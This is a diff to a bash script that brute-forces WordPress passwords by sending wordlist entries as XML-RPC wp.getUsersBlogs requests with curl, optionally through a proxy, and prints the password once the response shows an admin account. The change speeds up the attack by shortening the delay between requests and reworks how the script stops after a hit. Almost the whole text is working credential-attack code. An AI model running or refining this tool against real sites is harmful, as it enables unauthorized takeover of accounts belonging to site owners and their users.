@@ -10,7 +10,6 @@ purpleColour="\033[0;35m\033[1m"
 turquoiseColour="\033[0;36m\033[1m"
 grayColour="\033[0;37m\033[1m"
 
-isDone='no'
 
 function ctrl_c(){
   echo -e "\n\n${redColour}[!] Exiting...${endColour}\n"
@@ -69,9 +68,8 @@ function makeXML(){
   xmlData="""<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>${username}</value></param><param><value>${password}</value></param></params></methodCall>"""
 
   if [ "$(curl -s -X POST -x "$proxy" "$url" -d "$xmlData" $nossl | grep 'isAdmin')" ]; then
-    let isDone='yes'
     echo -e "\n\n${yellowColour}[+] ${grayColour}The password is:    ${blueColour}$password${endColour}\n"
-    tput cnorm && exit 0
+    tput cnorm && kill -s SIGINT $$ 2>/dev/null
   fi
 }
 
@@ -80,19 +78,15 @@ if [ $parameter_counter -eq 3 ]; then
     topCounter=100
     counter=0
     echo -e "${yellowColour}\n[*]${purpleColour} Bruteforcing...\n${endColour}"
-    cat $wordlist | while read password; do
-      if [ $isDone == 'no' ]; then
-        makeXML $url $username $password $proxy $nossl &
-        sleep 0.1
-        let counter+=1
-        if [ $counter -eq $topCounter ]; then
-            echo -ne "\t--> Tested passwords:  $counter  <--\r"
-            let topCounter+=100
-        fi
-      else
-        tput cnorm && exit 0
+    while read password; do
+      makeXML $url $username $password $proxy $nossl &
+      sleep 0.05
+      let counter+=1
+      if [ $counter -eq $topCounter ]; then
+          echo -ne "\t--> Tested  $counter  passwords <--\r"
+          let topCounter+=100
       fi
-    done; wait
+    done < $wordlist
   else
     echo -e "\n\n${redColour}[!] File not found${endColour}\n"
     tput cnorm && exit 1
